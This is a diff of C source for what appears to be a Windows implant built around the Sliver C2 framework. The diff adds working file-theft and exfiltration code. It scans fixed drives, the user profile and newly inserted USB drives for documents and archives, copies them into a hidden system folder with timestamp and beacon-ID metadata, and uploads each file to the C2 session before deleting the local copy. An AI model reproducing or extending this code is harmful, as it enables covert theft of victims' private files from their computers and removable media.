@@ -1422,21 +1422,44 @@ VOID CopyFileToWarehouse
 	DWORD dwNumberOfFreeClusters = 0;
 	DWORD dwTotalNumberOfClusters = 0;
 	UINT64 uPercentFull = 0;
-	DWORD dwDriveType = 0;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	DWORD dwFileSize = 0;
+	FILETIME CreationTime;
+	FILETIME LastAccessTime;
+	FILETIME LastWriteTime;
+	LPSTR lpConvertedPath = NULL;
+	CHAR szFileInfo[0x400];
+	SYSTEMTIME CreationSystemTime;
+	SYSTEMTIME LastAccessSystemTime;
+	SYSTEMTIME LastWriteSystemTime;
+	LPWSTR lpInfoPath = NULL;
 
-	PrintFormatW(L"%s\n", lpPath);
-	lpWarehouse = DuplicateStrW(pConfig->wszWarehouse, SHA256_HASH_SIZE + 1);
-	if (!IsFolderExist(lpWarehouse)) {
-		CreateDirectoryW(lpWarehouse, NULL);
-		SetFileAttributesW(lpWarehouse, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-	}
-
-	wszDriveName[0] += PathGetDriveNumberW(lpWarehouse);
-	dwDriveType = GetDriveTypeW(wszDriveName);
-	if (dwDriveType == DRIVE_REMOVABLE) {
+	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
 		goto CLEANUP;
 	}
 
+	if (!GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
+		CloseHandle(hFile);
+		goto CLEANUP;
+	}
+
+	CloseHandle(hFile);
+	PrintFormatW(L"%s\n", lpPath);
+	lpWarehouse = DuplicateStrW(pConfig->wszWarehouse, SHA256_HASH_SIZE + 0x10);
+	if (!IsFolderExist(lpWarehouse)) {
+		if (!CreateDirectoryW(lpWarehouse, NULL)) {
+			LOG_ERROR("CreateDirectoryW", GetLastError());
+			goto CLEANUP;
+		}
+
+		if (!SetFileAttributesW(lpWarehouse, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
+			LOG_ERROR("SetFileAttributesW", GetLastError());
+			goto CLEANUP;
+		}
+	}
+
+	wszDriveName[0] += PathGetDriveNumberW(lpWarehouse);
 	if (!GetDiskFreeSpaceW(wszDriveName, &dwSectorsPerCluster, &dwBytesPerSector, &dwNumberOfFreeClusters, &dwTotalNumberOfClusters)) {
 		LOG_ERROR("GetDiskFreeSpaceW", GetLastError());
 		goto CLEANUP;
@@ -1459,13 +1482,29 @@ VOID CopyFileToWarehouse
 	pNameDigest = ComputeSHA256(lpTemp, lstrlenA(lpTemp));
 	lpNameHexDigest = ConvertBytesToHexW(pNameDigest, SHA256_HASH_SIZE);
 	lpNameHexDigest[SHA256_HASH_SIZE] = L'\0';
-	lstrcatW(lpWarehouse, L"\\");
+	if (lpWarehouse[lstrlenW(lpWarehouse) - 1] != L'\\') {
+		lstrcatW(lpWarehouse, L"\\");
+	}
+
 	lstrcatW(lpWarehouse, lpNameHexDigest);
+	lpInfoPath = DuplicateStrW(lpWarehouse, 32);
+	lstrcatW(lpInfoPath, L"_INFO.txt");
 	if (!WriteToFile(lpWarehouse, pFileData, cbFileData)) {
 		goto CLEANUP;
 	}
 
+	lpConvertedPath = ConvertWcharToChar(lpPath);
+	FileTimeToSystemTime(&CreationTime, &CreationSystemTime);
+	FileTimeToSystemTime(&LastAccessTime, &LastAccessSystemTime);
+	FileTimeToSystemTime(&LastWriteTime, &LastWriteSystemTime);
+	wsprintfA(szFileInfo, "Session/Beacon ID: %s\nFile path: %s\nCreation time: %d/%d/%d %d:%d:%d\nLast access time: %d/%d/%d %d:%d:%d\nLast write time: %d/%d/%d %d:%d:%d", pConfig->szSessionID, lpConvertedPath, CreationSystemTime.wDay, CreationSystemTime.wMonth, CreationSystemTime.wYear, CreationSystemTime.wHour, CreationSystemTime.wMinute, CreationSystemTime.wSecond, LastAccessSystemTime.wDay, LastAccessSystemTime.wMonth, LastAccessSystemTime.wYear, LastAccessSystemTime.wHour, LastAccessSystemTime.wMinute, LastAccessSystemTime.wSecond, LastWriteSystemTime.wDay, LastWriteSystemTime.wMonth, LastWriteSystemTime.wYear, LastWriteSystemTime.wHour, LastWriteSystemTime.wMinute, LastWriteSystemTime.wSecond);
+	if (!WriteToFile(lpInfoPath, szFileInfo, lstrlenA(szFileInfo))) {
+		goto CLEANUP;
+	}
+
 CLEANUP:
+	FREE(lpInfoPath);
+	FREE(lpConvertedPath);
 	FREE(lpWarehouse);
 	FREE(pFileData);
 	FREE(lpTemp);
@@ -1476,7 +1515,7 @@ CLEANUP:
 BOOL StealFile
 (
 	_In_ LPWSTR lpPath,
-	_In_ PGLOBAL_CONFIG pConfig
+	_In_ LPVOID* Args
 )
 {
 	DWORD i = 0;
@@ -1489,22 +1528,38 @@ BOOL StealFile
 	DWORD dwNumberOfItems = 0;
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 	DWORD dwFileSize = 0;
+	BOOL IsUsb = FALSE;
+	PGLOBAL_CONFIG pConfig = NULL;
+	FILETIME LastWriteTime;
+	BOOL Result = FALSE;
 
-	if (StrStrW(lpPath, L"RECYCLE.BIN")) {
+	IsUsb = (BOOL)Args[0];
+	pConfig = (PGLOBAL_CONFIG)Args[1];
+	if (pConfig->StopLooting) {
+		Result = TRUE;
 		goto CLEANUP;
 	}
 
-	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (StrStrIW(lpPath, L"RECYCLE.BIN")) {
+		goto CLEANUP;
+	}
+	
+	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 		goto CLEANUP;
 	}
+	
+	if (!IsUsb && GetFileTime(hFile, NULL, NULL, &LastWriteTime)) {
+		if (CompareFileTime(&LastWriteTime, &pConfig->LastLootTime) != 1) {
+			goto CLEANUP;
+		}
+	}
 
 	dwFileSize = GetFileSize(hFile, NULL);
-	CloseHandle(hFile);
 	lpExtension = PathFindExtensionW(lpPath);
 	if (lpExtension[0] != L'\0') {
 		for (i = 0; i < pConfig->cDocumentExtensions; i++) {
-			if (!lstrcmpiW(lpExtension, pConfig->DocumentExtensions[i])) {
+			if (!lstrcmpW(lpExtension, pConfig->DocumentExtensions[i])) {
 				if (dwFileSize > 500000000) {
 					goto CLEANUP;
 				}
@@ -1515,7 +1570,7 @@ BOOL StealFile
 		}
 
 		for (i = 0; i < pConfig->cArchiveExtensions; i++) {
-			if (!lstrcmpiW(lpExtension, pConfig->ArchiveExtensions[i])) {
+			if (!lstrcmpW(lpExtension, pConfig->ArchiveExtensions[i])) {
 				if (dwFileSize > 100000000) {
 					break;
 				}
@@ -1534,7 +1589,7 @@ BOOL StealFile
 					lpExtension2 = PathFindExtensionW(pItem->lpPath);
 					if (lpExtension2[0] != L'\0') {
 						for (k = 0; k < pConfig->cDocumentExtensions; k++) {
-							if (!lstrcmpiW(lpExtension2, pConfig->DocumentExtensions[k])) {
+							if (!lstrcmpW(lpExtension2, pConfig->DocumentExtensions[k])) {
 								CopyFileToWarehouse(lpPath, pConfig);
 								goto CLEANUP;
 							}
@@ -1548,6 +1603,10 @@ BOOL StealFile
 	}
 
 CLEANUP:
+	if (hFile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hFile);
+	}
+
 	if (ItemList != NULL) {
 		for (j = 0; j < dwNumberOfItems; j++) {
 			FreeItemInfo(ItemList[j]);
@@ -1556,7 +1615,7 @@ CLEANUP:
 		FREE(ItemList);
 	}
 
-	return FALSE;
+	return Result;
 }
 
 BOOL LootFileCallback
@@ -1614,11 +1673,13 @@ VOID MonitorUsbCallback
 )
 {
 	LPWSTR lpDeviceID = NULL;
+	LPVOID Args[2];
 
 	lpDeviceID = SearchMatchStrW(lpInput, L"DeviceID = \"", L"\";\n");
 	lpDeviceID = StrCatExW(lpDeviceID, L"\\");
-	ListFileEx(lpDeviceID, LIST_RECURSIVELY | LIST_JUST_FILE, StealFile, pConfig);
-
+	Args[0] = TRUE;
+	Args[1] = pConfig;
+	ListFileEx(lpDeviceID, LIST_RECURSIVELY | LIST_JUST_FILE, StealFile, Args);
 CLEANUP:
 	FREE(lpDeviceID);
 }
@@ -1628,24 +1689,6 @@ VOID MonitorUsb
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
-	/*DEV_BROADCAST_DEVICEINTERFACE_W DeviceInterface;
-	HDEVNOTIFY hNotify = NULL;
-	GUID UsbDeviceGUID = { 0xA5DCBF10L, 0x6530, 0x11D2, { 0x90, 0x1F, 0x00, 0xC0, 0x4F, 0xB9, 0x51, 0xED } };
-
-	SecureZeroMemory(&DeviceInterface, sizeof(DeviceInterface));
-	DeviceInterface.dbcc_size = sizeof(DeviceInterface);
-	DeviceInterface.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
-	memcpy(&DeviceInterface.dbcc_classguid, &UsbDeviceGUID, sizeof(DeviceInterface.dbcc_classguid));
-
-	hNotify = RegisterDeviceNotificationW(NULL, &DeviceInterface, DEVICE_NOTIFY_WINDOW_HANDLE);
-	if (hNotify == NULL) {
-		LOG_ERROR("RegisterDeviceNotificationW", GetLastError());
-		goto CLEANUP;
-	}
-
-	pConfig->hDevNotify = hNotify;
-CLEANUP:
-	return;*/
 	while (TRUE) {
 		RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_LogicalDisk'", MonitorUsbCallback, pConfig);
 		Sleep(60000);
@@ -1661,28 +1704,113 @@ VOID LootFile
 	WCHAR wszSystem32[MAX_PATH];
 	WCHAR wszUserProfile[MAX_PATH];
 	LPWSTR lpTemp = NULL;
+	DWORD dwDriveType = 0;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	WCHAR wszDrivePath[] = L"\\\\.\\A:";
+	STORAGE_HOTPLUG_INFO HotPlugInfo;
+	DWORD dwBytesReturned = 0;
+	LPVOID Args[2];
 
+	GetSystemDirectoryW(wszSystem32, _countof(wszSystem32));
+	ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
+	SecureZeroMemory(&Args, sizeof(Args));
+	Args[1] = pConfig;
 	while (TRUE) {
 		SecureZeroMemory(wszLogicalDrives, sizeof(wszLogicalDrives));
 		GetLogicalDriveStringsW(_countof(wszLogicalDrives), wszLogicalDrives);
 		lpTemp = wszLogicalDrives;
-		GetSystemDirectoryW(wszSystem32, _countof(wszSystem32));
 		while (TRUE) {
 			if (lpTemp[0] == L'\0') {
 				break;
 			}
 
-			if (IsStrStartsWithW(wszSystem32, lpTemp)) {
-				lpTemp += lstrlenW(lpTemp) + 1;
-				continue;
+			if (!IsStrStartsWithW(wszSystem32, lpTemp)) {
+				dwDriveType = GetDriveTypeW(lpTemp);
+				if (dwDriveType == DRIVE_FIXED) {
+					wszDrivePath[lstrlenW(wszDrivePath) - 2] = lpTemp[0];
+					hFile = CreateFileW(wszDrivePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+					if (hFile != INVALID_HANDLE_VALUE) {
+						SecureZeroMemory(&HotPlugInfo, sizeof(HotPlugInfo));
+						if (DeviceIoControl(hFile, IOCTL_STORAGE_GET_HOTPLUG_INFO, NULL, 0, &HotPlugInfo, sizeof(HotPlugInfo), &dwBytesReturned, NULL)) {
+							if (HotPlugInfo.DeviceHotplug) {
+								CloseHandle(hFile);
+								lpTemp += lstrlenW(lpTemp) + 1;
+								continue;
+							}
+						}
+
+						CloseHandle(hFile);
+					}
+
+					ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, Args);
+				}
 			}
 
-			ListFileEx(lpTemp, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
 			lpTemp += lstrlenW(lpTemp) + 1;
 		}
 
-		ExpandEnvironmentStringsW(L"%USERPROFILE%", wszUserProfile, _countof(wszUserProfile));
-		ListFileEx(wszUserProfile, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
+		ListFileEx(wszUserProfile, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, Args);
+		GetSystemTimeAsFileTime(&pConfig->LastLootTime);
 		Sleep(600000);
 	}
+}
+
+BOOL UploadLootedFileCallback
+(
+	_In_ LPWSTR lpPath,
+	_In_ PSLIVER_SESSION_CLIENT pSession
+)
+{
+	ENVELOPE Envelope;
+	PBYTE pFileData = NULL;
+	DWORD cbFileData = 0;
+
+	SecureZeroMemory(&Envelope, sizeof(Envelope));
+	Envelope.uType = MsgLootFile;
+	pFileData = ReadFromFile(lpPath, &cbFileData);
+	if (pFileData == NULL) {
+		goto CLEANUP;
+	}
+
+	if (!DeleteFileW(lpPath)) {
+		LOG_ERROR("DeleteFileW", GetLastError());
+		goto CLEANUP;
+	}
+
+	Envelope.pData = BufferMove(pFileData, cbFileData);
+	pFileData = NULL;
+	pSession->Send(pSession->pGlobalConfig, pSession->lpClient, &Envelope);
+CLEANUP:
+	FreeBuffer(Envelope.pData);
+	return FALSE;
+}
+
+VOID SliverUploadLootedFile
+(
+	_In_ PSLIVER_SESSION_CLIENT pSession
+)
+{
+	PGLOBAL_CONFIG pConfig = NULL;
+	LPWSTR lpWarehouse = NULL;
+
+	pConfig = pSession->pGlobalConfig;
+	lpWarehouse = pConfig->wszWarehouse;
+	if (!IsFolderExist(lpWarehouse)) {
+		if (!CreateDirectoryW(lpWarehouse, NULL)) {
+			LOG_ERROR("CreateDirectoryW", GetLastError());
+			goto CLEANUP;
+		}
+
+		if (!SetFileAttributesW(lpWarehouse, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
+			LOG_ERROR("SetFileAttributesW", GetLastError());
+			goto CLEANUP;
+		}
+	}
+
+	while (TRUE) {
+		ListFileEx(lpWarehouse, LIST_JUST_FILE, UploadLootedFileCallback, pSession);
+		Sleep(600000);
+	}
+CLEANUP:
+	return;
 }
